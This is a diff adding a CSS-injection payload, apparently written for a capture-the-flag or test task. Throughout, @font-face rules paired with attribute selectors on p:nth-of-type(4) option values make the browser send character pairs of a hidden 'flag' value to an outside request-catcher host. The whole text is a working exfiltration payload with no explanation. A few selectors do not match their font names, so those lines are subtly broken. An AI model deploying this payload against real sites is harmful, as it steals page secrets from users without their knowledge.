+@font-face {
+    font-family: "pair-t{";
+    src: url('https://css_task_test.requestcatcher.com/flag?t%7B');
+}
+p:nth-of-type(4) option[value*="t{"] {
+    font-family: "pair-t{";
+}
+@font-face {
+    font-family: "pair-t_";
+    src: url('https://css_task_test.requestcatcher.com/flag?t_');
+}
+p:nth-of-type(4) option[value*="t_"] {
+    font-family: "pair-t_";
+}
+@font-face {
+    font-family: "pair-t}";
+    src: url('https://css_task_test.requestcatcher.com/flag?t%7D');
+}
+p:nth-of-type(4) option[value*="t}"] {
+    font-family: "pair-t}";
+}
+@font-face {
+    font-family: "pair-tx";
+    src: url('https://css_task_test.requestcatcher.com/flag?tx');
+}
+p:nth-of-type(4) option[value*="tx"] {
+    font-family: "pair-tx";
+}
+@font-face {
+    font-family: "pair-tv";
+    src: url('https://css_task_test.requestcatcher.com/flag?tv');
+}
+p:nth-of-type(4) option[value*="tv"] {
+    font-family: "pair-tv";
+}
+@font-face {
+    font-family: "pair-{a";
+    src: url('https://css_task_test.requestcatcher.com/flag?%7Ba');
+}
+p:nth-of-type(4) option[value*="{a"] {
+    font-family: "pair-{a";
+}
+@font-face {
+    font-family: "pair-{e";
+    src: url('https://css_task_test.requestcatcher.com/flag?%7Be');
+}
+p:nth-of-type(4) option[value*="{e"] {
+    font-family: "pair-{e";
+}
+@font-face {
+    font-family: "pair-{h";
+    src: url('https://css_task_test.requestcatcher.com/flag?%7Bh');
+}
+p:nth-of-type(4) option[value*="{h"] {
+    font-family: "pair-{h";
+}
+@font-face {
+    font-family: "pair-{g";
+    src: url('https://css_task_test.requestcatcher.com/flag?%7Bg');
+}
+p:nth-of-type(4) option[value*="{g"] {
+    font-family: "pair-{g";
+}
+@font-face {
+    font-family: "pair-{k";
+    src: url('https://css_task_test.requestcatcher.com/flag?%7Bk');
+}
+p:nth-of-type(4) option[value*="{k"] {
+    font-family: "pair-{k";
+}
+@font-face {
+    font-family: "pair-{i";
+    src: url('https://css_task_test.requestcatcher.com/flag?%7Bi');
+}
+p:nth-of-type(4) option[value*="{i"] {
+    font-family: "pair-{i";
+}
+@font-face {
+    font-family: "pair-{l";
+    src: url('https://css_task_test.requestcatcher.com/flag?%7Bl');
+}
+p:nth-of-type(4) option[value*="{l"] {
+    font-family: "pair-{l";
+}
+@font-face {
+    font-family: "pair-{s";
+    src: url('https://css_task_test.requestcatcher.com/flag?%7Bs');
+}
+p:nth-of-type(4) option[value*="{s"] {
+    font-family: "pair-{s";
+}
+@font-face {
+    font-family: "pair-{o";
+    src: url('https://css_task_test.requestcatcher.com/flag?%7Bo');
+}
+p:nth-of-type(4) option[value*="{o"] {
+    font-family: "pair-{o";
+}
+@font-face {
+    font-family: "pair-{p";
+    src: url('https://css_task_test.requestcatcher.com/flag?%7Bp');
+}
+p:nth-of-type(4) option[value*="{p"] {
+    font-family: "pair-{p";
+}
+@font-face {
+    font-family: "pair-{t";
+    src: url('https://css_task_test.requestcatcher.com/flag?%7Bt');
+}
+p:nth-of-type(4) option[value*="{t"] {
+    font-family: "pair-{t";
+}
+@font-face {
+    font-family: "pair-{_";
+    src: url('https://css_task_test.requestcatcher.com/flag?%7B_');
+}
+p:nth-of-type(4) option[value*="{_"] {
+    font-family: "pair-{_";
+}
+@font-face {
+    font-family: "pair-{}";
+    src: url('https://css_task_test.requestcatcher.com/flag?%7B%7D');
+}
+p:nth-of-type(4) option[value*="{"] {
+    font-family: "pair-{}";
+}
+@font-face {
+    font-family: "pair-{x";
+    src: url('https://css_task_test.requestcatcher.com/flag?%7Bx');
+}
+p:nth-of-type(4) option[value*="{x"] {
+    font-family: "pair-{x";
+}
+@font-face {
+    font-family: "pair-{v";
+    src: url('https://css_task_test.requestcatcher.com/flag?%7Bv');
+}
+p:nth-of-type(4) option[value*="{v"] {
+    font-family: "pair-{v";
+}
+@font-face {
+    font-family: "pair-_a";
+    src: url('https://css_task_test.requestcatcher.com/flag?_a');
+}
+p:nth-of-type(4) option[value*="_a"] {
+    font-family: "pair-_a";
+}
+@font-face {
+    font-family: "pair-_e";
+    src: url('https://css_task_test.requestcatcher.com/flag?_e');
+}
+p:nth-of-type(4) option[value*="_e"] {
+    font-family: "pair-_e";
+}
+@font-face {
+    font-family: "pair-_h";
+    src: url('https://css_task_test.requestcatcher.com/flag?_h');
+}
+p:nth-of-type(4) option[value*="_h"] {
+    font-family: "pair-_h";
+}
+@font-face {
+    font-family: "pair-_g";
+    src: url('https://css_task_test.requestcatcher.com/flag?_g');
+}
+p:nth-of-type(4) option[value*="_g"] {
+    font-family: "pair-_g";
+}
+@font-face {
+    font-family: "pair-_k";
+    src: url('https://css_task_test.requestcatcher.com/flag?_k');
+}
+p:nth-of-type(4) option[value*="_k"] {
+    font-family: "pair-_k";
+}
+@font-face {
+    font-family: "pair-_i";
+    src: url('https://css_task_test.requestcatcher.com/flag?_i');
+}
+p:nth-of-type(4) option[value*="_i"] {
+    font-family: "pair-_i";
+}
+@font-face {
+    font-family: "pair-_l";
+    src: url('https://css_task_test.requestcatcher.com/flag?_l');
+}
+p:nth-of-type(4) option[value*="_l"] {
+    font-family: "pair-_l";
+}
+@font-face {
+    font-family: "pair-_s";
+    src: url('https://css_task_test.requestcatcher.com/flag?_s');
+}
+p:nth-of-type(4) option[value*="_s"] {
+    font-family: "pair-_s";
+}
+@font-face {
+    font-family: "pair-_o";
+    src: url('https://css_task_test.requestcatcher.com/flag?_o');
+}
+p:nth-of-type(4) option[value*="_o"] {
+    font-family: "pair-_o";
+}
+@font-face {
+    font-family: "pair-_p";
+    src: url('https://css_task_test.requestcatcher.com/flag?_p');
+}
+p:nth-of-type(4) option[value*="_p"] {
+    font-family: "pair-_p";
+}
+@font-face {
+    font-family: "pair-_t";
+    src: url('https://css_task_test.requestcatcher.com/flag?_t');
+}
+p:nth-of-type(4) option[value*="_t"] {
+    font-family: "pair-_t";
+}
+@font-face {
+    font-family: "pair-_{";
+    src: url('https://css_task_test.requestcatcher.com/flag?_%7B');
+}
+p:nth-of-type(4) option[value*="_ "] {
+    font-family: "pair-_{";
+}
+@font-face {
+    font-family: "pair-_}";
+    src: url('https://css_task_test.requestcatcher.com/flag?_%7D');
+}
+p:nth-of-type(4) option[value*="_}"] {
+    font-family: "pair-_}";
+}
+@font-face {
+    font-family: "pair-_x";
+    src: url('https://css_task_test.requestcatcher.com/flag?_x');
+}
+p:nth-of-type(4) option[value*="_x"] {
+    font-family: "pair-_x";
+}
+@font-face {
+    font-family: "pair-_v";
+    src: url('https://css_task_test.requestcatcher.com/flag?_v');
+}
+p:nth-of-type(4) option[value*="_v"] {
+    font-family: "pair-_v";
+}
+@font-face {
+    font-family: "pair-}a";
+    src: url('https://css_task_test.requestcatcher.com/flag?%7Da');
+}
+p:nth-of-type(4) option[value*="}a"] {
+    font-family: "pair-}a";
+}
+@font-face {
+    font-family: "pair-}e";
+    src: url('https://css_task_test.requestcatcher.com/flag?%7De');
+}
+p:nth-of-type(4) option[value*="}e"] {
+    font-family: "pair-}e";
+}
+@font-face {
+    font-family: "pair-}h";
+    src: url('https://css_task_test.requestcatcher.com/flag?%7Dh');
+}
+p:nth-of-type(4) option[value*="}h"] {
+    font-family: "pair-}h";
+}
+@font-face {
+    font-family: "pair-}g";
+    src: url('https://css_task_test.requestcatcher.com/flag?%7Dg');
+}
+p:nth-of-type(4) option[value*="}g"] {
+    font-family: "pair-}g";
+}
+@font-face {
+    font-family: "pair-}k";
+    src: url('https://css_task_test.requestcatcher.com/flag?%7Dk');
+}
+p:nth-of-type(4) option[value*="}k"] {
+    font-family: "pair-}k";
+}
+@font-face {
+    font-family: "pair-}i";
+    src: url('https://css_task_test.requestcatcher.com/flag?%7Di');
+}
+p:nth-of-type(4) option[value*="}i"] {
+    font-family: "pair-}i";
+}
+@font-face {
+    font-family: "pair-}l";
+    src: url('https://css_task_test.requestcatcher.com/flag?%7Dl');
+}
+p:nth-of-type(4) option[value*="}l"] {
+    font-family: "pair-}l";
+}
+@font-face {
+    font-family: "pair-}s";
+    src: url('https://css_task_test.requestcatcher.com/flag?%7Ds');
+}
+p:nth-of-type(4) option[value*="}s"] {
+    font-family: "pair-}s";
+}
+@font-face {
+    font-family: "pair-}o";
+    src: url('https://css_task_test.requestcatcher.com/flag?%7Do');
+}
+p:nth-of-type(4) option[value*="}o"] {
+    font-family: "pair-}o";
+}
+@font-face {
+    font-family: "pair-}p";
+    src: url('https://css_task_test.requestcatcher.com/flag?%7Dp');
+}
+p:nth-of-type(4) option[value*="}p"] {
+    font-family: "pair-}p";
+}
+@font-face {
+    font-family: "pair-}t";
+    src: url('https://css_task_test.requestcatcher.com/flag?%7Dt');
+}
+p:nth-of-type(4) option[value*="}t"] {
+    font-family: "pair-}t";
+}
+@font-face {
+    font-family: "pair-}{";
+    src: url('https://css_task_test.requestcatcher.com/flag?%7D%7B');
+}
+p:nth-of-type(4) option[value*="}{"] {
+    font-family: "pair-}{";
+}
+@font-face {
+    font-family: "pair-}_";
+    src: url('https://css_task_test.requestcatcher.com/flag?%7D_');
+}
+p:nth-of-type(4) option[value*="}_"] {
+    font-family: "pair-}_";
+}
+@font-face {
+    font-family: "pair-}x";
+    src: url('https://css_task_test.requestcatcher.com/flag?%7Dx');
+}
+p:nth-of-type(4) option[value*="}x"] {
+    font-family: "pair-}x";
+}
+@font-face {
+    font-family: "pair-}v";
+    src: url('https://css_task_test.requestcatcher.com/flag?%7Dv');
+}
+p:nth-of-type(4) option[value*="}v"] {
+    font-family: "pair-}v";
+}
+@font-face {
+    font-family: "pair-xa";
+    src: url('https://css_task_test.requestcatcher.com/flag?xa');
+}
+p:nth-of-type(4) option[value*="xa"] {
+    font-family: "pair-xa";
+}
+@font-face {
+    font-family: "pair-xe";
+    src: url('https://css_task_test.requestcatcher.com/flag?xe');
+}
+p:nth-of-type(4) option[value*="xe"] {
+    font-family: "pair-xe";
+}
+@font-face {
+    font-family: "pair-xh";
+    src: url('https://css_task_test.requestcatcher.com/flag?xh');
+}
+p:nth-of-type(4) option[value*="xh"] {
+    font-family: "pair-xh";
+}
+@font-face {
+    font-family: "pair-xg";
+    src: url('https://css_task_test.requestcatcher.com/flag?xg');
+}
+p:nth-of-type(4) option[value*="xg"] {
+    font-family: "pair-xg";
+}
+@font-face {
+    font-family: "pair-xk";
+    src: url('https://css_task_test.requestcatcher.com/flag?xk');
+}
+p:nth-of-type(4) option[value*="xk"] {
+    font-family: "pair-xk";
+}
+@font-face {
+    font-family: "pair-xi";
+    src: url('https://css_task_test.requestcatcher.com/flag?xi');
+}
+p:nth-of-type(4) option[value*="xi"] {
+    font-family: "pair-xi";
+}
+@font-face {
+    font-family: "pair-xl";
+    src: url('https://css_task_test.requestcatcher.com/flag?xl');
+}
+p:nth-of-type(4) option[value*="xl"] {
+    font-family: "pair-xl";
+}
+@font-face {
+    font-family: "pair-xs";
+    src: url('https://css_task_test.requestcatcher.com/flag?xs');
+}
+p:nth-of-type(4) option[value*="xs"] {
+    font-family: "pair-xs";
+}
+@font-face {
+    font-family: "pair-xo";
+    src: url('https://css_task_test.requestcatcher.com/flag?xo');
+}
+p:nth-of-type(4) option[value*="xo"] {
+    font-family: "pair-xo";
+}
+@font-face {
+    font-family: "pair-xp";
+    src: url('https://css_task_test.requestcatcher.com/flag?xp');
+}
+p:nth-of-type(4) option[value*="xp"] {
+    font-family: "pair-xp";
+}
+@font-face {
+    font-family: "pair-xt";
+    src: url('https://css_task_test.requestcatcher.com/flag?xt');
+}
+p:nth-of-type(4) option[value*="xt"] {
+    font-family: "pair-xt";
+}
+@font-face {
+    font-family: "pair-x{";
+    src: url('https://css_task_test.requestcatcher.com/flag?x%7B');
+}
+p:nth-of-type(4) option[value*="x{"] {
+    font-family: "pair-x{";
+}
+@font-face {
+    font-family: "pair-x_";
+    src: url('https://css_task_test.requestcatcher.com/flag?x_');
+}
+p:nth-of-type(4) option[value*="x_"] {
+    font-family: "pair-x_";
+}
+@font-face {
+    font-family: "pair-x}";
+    src: url('https://css_task_test.requestcatcher.com/flag?x%7D');
+}
+p:nth-of-type(4) option[value*="x}"] {
+    font-family: "pair-x}";
+}
+@font-face {
+    font-family: "pair-xv";
+    src: url('https://css_task_test.requestcatcher.com/flag?xv');
+}
+p:nth-of-type(4) option[value*="xv"] {
+    font-family: "pair-xv";
+}
+@font-face {
+    font-family: "pair-va";
+    src: url('https://css_task_test.requestcatcher.com/flag?va');
+}
+p:nth-of-type(4) option[value*="va"] {
+    font-family: "pair-va";
+}
+@font-face {
+    font-family: "pair-ve";
+    src: url('https://css_task_test.requestcatcher.com/flag?ve');
+}
+p:nth-of-type(4) option[value*="ve"] {
+    font-family: "pair-ve";
+}
+@font-face {
+    font-family: "pair-vh";
+    src: url('https://css_task_test.requestcatcher.com/flag?vh');
+}
+p:nth-of-type(4) option[value*="vh"] {
+    font-family: "pair-vh";
+}
+@font-face {
+    font-family: "pair-vg";
+    src: url('https://css_task_test.requestcatcher.com/flag?vg');
+}
+p:nth-of-type(4) option[value*="vg"] {
+    font-family: "pair-vg";
+}
+@font-face {
+    font-family: "pair-vk";
+    src: url('https://css_task_test.requestcatcher.com/flag?vk');
+}
+p:nth-of-type(4) option[value*="vk"] {
+    font-family: "pair-vk";
+}
+@font-face {
+    font-family: "pair-vi";
+    src: url('https://css_task_test.requestcatcher.com/flag?vi');
+}
+p:nth-of-type(4) option[value*="vi"] {
+    font-family: "pair-vi";
+}
+@font-face {
+    font-family: "pair-vl";
+    src: url('https://css_task_test.requestcatcher.com/flag?vl');
+}
+p:nth-of-type(4) option[value*="vl"] {
+    font-family: "pair-vl";
+}
+@font-face {
+    font-family: "pair-vs";
+    src: url('https://css_task_test.requestcatcher.com/flag?vs');
+}
+p:nth-of-type(4) option[value*="vs"] {
+    font-family: "pair-vs";
+}
+@font-face {
+    font-family: "pair-vo";
+    src: url('https://css_task_test.requestcatcher.com/flag?vo');
+}
+p:nth-of-type(4) option[value*="vo"] {
+    font-family: "pair-vo";
+}
+@font-face {
+    font-family: "pair-vp";
+    src: url('https://css_task_test.requestcatcher.com/flag?vp');
+}
+p:nth-of-type(4) option[value*="vp"] {
+    font-family: "pair-vp";
+}
+@font-face {
+    font-family: "pair-vt";
+    src: url('https://css_task_test.requestcatcher.com/flag?vt');
+}
+p:nth-of-type(4) option[value*="vt"] {
+    font-family: "pair-vt";
+}
+@font-face {
+    font-family: "pair-v{";
+    src: url('https://css_task_test.requestcatcher.com/flag?v%7B');
+}
+p:nth-of-type(4) option[value*="v{"] {
+    font-family: "pair-v{";
+}
+@font-face {
+    font-family: "pair-v_";
+    src: url('https://css_task_test.requestcatcher.com/flag?v_');
+}
+p:nth-of-type(4) option[value*="v_"] {
+    font-family: "pair-v_";
+}
+@font-face {
+    font-family: "pair-v}";
+    src: url('https://css_task_test.requestcatcher.com/flag?v%7D');
+}
+p:nth-of-type(4) option[value*="v}"] {
+    font-family: "pair-v}";
+}
+@font-face {
+    font-family: "pair-vx";
+    src: url('https://css_task_test.requestcatcher.com/flag?vx');
+}
+p:nth-of-type(4) option[value*="vx"] {
+    font-family: "pair-vx";
+}
